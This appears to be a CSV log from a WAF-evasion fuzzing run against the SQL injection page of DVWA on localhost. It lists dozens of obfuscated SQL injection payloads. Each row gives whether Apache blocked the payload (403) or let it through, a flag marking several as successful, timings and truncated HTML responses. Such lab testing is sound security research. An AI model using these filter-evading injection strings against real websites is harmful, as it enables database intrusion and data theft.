Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1%0b||+!%0b1=%0b(!+1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0217,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+not+{a+1}=1=%0b(!%0b{a%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0225,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+not~0=+(!%0b{a+1}=1)+||%27,Bypassed,No,None,Invalid,0.0349,70.19,No,500,
0%27<@=1.%0b||+!+{x%0b(select+1)}=1=+(not%0btrue)+||',Bypassed,No,None,Invalid,0.0105,70.19,No,500,
0%27<@=1+or%0b{`if`+1}=1%0blike+{x%0b(select+1)}=1%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0349,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not+1=%0b(not+{x+(select%0b1)}=1)--+,Bypassed,No,None,Invalid,0.0228,70.19,No,500,
0%27<@=.1+||+!%0b{a+1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.011,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0b0=+(not%7efalse)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0436,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0331,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0bnot%0b{x+(select+1)}=1=+(not%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0181,70.19,No,500,
0%27<@!=.1+or+not+{a%0b1}=1=%0b(not%7efalse)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0502,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+not+{a+1}=1=+(!~false)+or',Bypassed,No,None,Invalid,0.0349,70.19,No,500,
0%27<@=1.%0b||%0bnot+{`if`+1}=1=+(not%0btrue)%0bor',Bypassed,No,None,Invalid,0.0239,70.19,No,500,
0'<@=1.%0bor+!%0b{`if`+1}=1=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,Invalid,0.041,70.19,No,500,
0%27<@!=1%0b||+!+{x+(select%0b1)}=1=%0b(not~0)+||',Bypassed,No,None,Invalid,0.0256,70.19,No,500,
0%27<@=.1%0b||+not+{x+(select+1)}=1=+(not%0b{`if`+1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0163,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+{x%0b(select+1)}=1+like+{x+(select+1)}=1%0b||%27,Bypassed,No,None,Invalid,0.0539,70.19,No,500,
0'<@!=.1%0bor+!+{`if`+1}=1=+(not%0b{a+1}=1)%0b||%27,Bypassed,No,None,Invalid,0.0258,70.19,No,500,
0%27<@=1.+||+!%0b{x+(select%0b1)}=1=%0b(!~false)%0bor',Bypassed,No,None,Invalid,0.0213,70.19,No,500,
0%27<@!=1+||+!+{`if`%0b1}=1=+(not%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0161,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+!+{`if`%0b1}=1=%0b(not+{a+1}=1)+or%27,Bypassed,No,None,Invalid,0.017,70.19,No,500,
0'<@=1+or+!%7efalse=%0b(!%7e0)%0bor%27,Bypassed,No,None,Invalid,0.0181,70.19,No,500,
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=+(0)%0b||',Bypassed,No,None,Invalid,0.0167,70.19,No,500,
0'<@=.1+||+!%7e0=%0b(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.0369,70.19,No,500,
0%27<@=1.%0bor+not%0b{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Invalid,0.0153,70.19,No,500,
0'||+@<@.+||%0b!%7e0=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0282,70.19,No,500,
0%27<@=1.+||+!+{x+(select+1)}=1=%0b(not+{x+(select+1)}=1)%0bor%27,Blocked,No,None,Invalid,0.0278,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+||+not+{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0469,70.44,No,500,
0'<@=.1+||%0bnot+{x+(select%0b1)}=1=+(!~0)%23,Blocked,No,None,Invalid,0.0184,70.44,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||%0bnot+{x+(select%0b1)}=1=%0b(not%0b{a+1}=1)%23,Blocked,No,None,Invalid,0.0206,70.44,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0bor+1+like%0b{a+1}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0359,70.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+not+{a+1}=1=%0b(false)+or',Bypassed,No,None,Invalid,0.0156,70.44,No,500,
0'<@=.1+or%0b!+{a+1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Invalid,0.0214,70.44,No,500,
0%27<@=1%0b||%0b!+{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0299,70.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+not+{a%0b1}=1=+(!%0b{x+(select+1)}=1)--+,Bypassed,No,None,Invalid,0.0261,70.44,No,500,
0'<@=1+||%0b!~false=+(!+{`if`+1}=1)+or%27,Bypassed,No,None,Invalid,0.0218,70.44,No,500,
0%27<@=1.%0b||%0bnot%7e0=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0441,70.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+not+1=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0252,70.44,No,500,
0%27<@!=1.+or%0b{x+(select+1)}=1+like+{a+1}=1+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0614,70.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+!+{x%0b(select+1)}=1=%0b(not%7efalse)+or',Bypassed,No,None,Invalid,0.0328,70.44,No,500,
0%27<@!=.1%0bor+not%0b{a+1}=1=%0b(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0311,69.72,No,500,
0%27<@=.1+||+not+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0354,70.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+or',Blocked,No,None,Invalid,0.0258,70.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||%0b!+{x+(select%0b1)}=1=%0b(!~false)+||%27,Blocked,No,None,Invalid,0.0259,70.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||%0bnot%0b{`if`%0b1}=1=%0b(!+{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0507,70.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+not+{`if`+1}=1=+(!~0)%23,Bypassed,No,None,Invalid,0.0375,70.19,No,500,
0%27<@!=.1%0b||+not%0b{x%0b(select%0b1)}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0364,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!+{`if`+1}=1=+(!+{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0252,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+not+1=+(not+{a+1}=1)--+,Blocked,No,None,Invalid,0.0263,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0bor%0b!%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Invalid,0.0444,70.19,No,500,
0'<@!=1+or%0b!%0b1=%0b(!+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Invalid,0.0468,70.19,No,500,
0%27<@!=.1%0b||+not+{x%0b(select+1)}=1=%0b(not%7efalse)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0292,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||%0bnot+{a+1}=1=%0b(!+{`if`%0b1}=1)%23,Bypassed,No,None,Invalid,0.0199,70.19,No,500,
0'<@=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not%0b{a%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.017,70.19,No,500,
0'<@=1%0bor+not%7efalse%0bis%0bfalse%0bor',Bypassed,No,None,Invalid,0.0201,70.19,No,500,
0'<@=1.+or+not%0b{`if`+1}=1=+(!+{a%0b1}=1)+||%27,Bypassed,No,None,Invalid,0.0311,70.19,No,500,
0'<@=1+||%0b!~0=%0b(not+{x+(select%0b1)}=1)%23,Bypassed,No,None,Invalid,0.0162,70.19,No,500,
0%27<@=.1+||+not%7e0=%0b(not%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0334,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0bnot%0b{`if`+1}=1=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0235,70.19,No,500,
0%27<@=1.%0bor+!%0b{`if`+1}=1+is+false+or',Bypassed,No,None,Invalid,0.0117,70.19,No,500,
0%27<@!=1+||+not+{x+(select+1)}=1=+(not+{x+(select+1)}=1)%0bor%27,Blocked,No,None,Invalid,0.0154,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor%0bnot+{`if`%0b1}=1=+(!+{a%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0374,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor%0bnot%0b{`if`%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Invalid,0.024,70.19,No,500,
0%27<@!=.1%0b||+!%0b{a+1}=1=%0b(not+1)+or',Bypassed,No,None,Invalid,0.0262,70.19,No,500,
0'<@=1.+or+!+{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,No,None,Invalid,0.0344,70.19,No,500,
0%27<@!=.1%0bor%0bnot+1=%0b(!%0b1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0324,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not+{x+(select+1)}=1=%0b(not~0)+or%27,Blocked,No,None,Invalid,0.0398,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||+!%0b{`if`%0b1}=1=%0b(!~0)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0509,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+not%0b{a%0b1}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0441,70.19,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot+{x+(select%0b1)}=1=+(!%0b{a+1}=1)%23,Blocked,No,None,Invalid,0.0279,70.19,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||%0bnot+{`if`%0b1}=1=%0b(not+{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0564,70.19,No,500,
0'<@!=.1%0bor%0bnot+{x+(select+1)}=1=%0b(not%0b{`if`+1}=1)+or%27,Bypassed,No,None,Invalid,0.0297,70.19,No,500,
0%27<@=1+or+!+{a+1}=1=%0b(!+{x%0b(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0231,70.19,No,500,
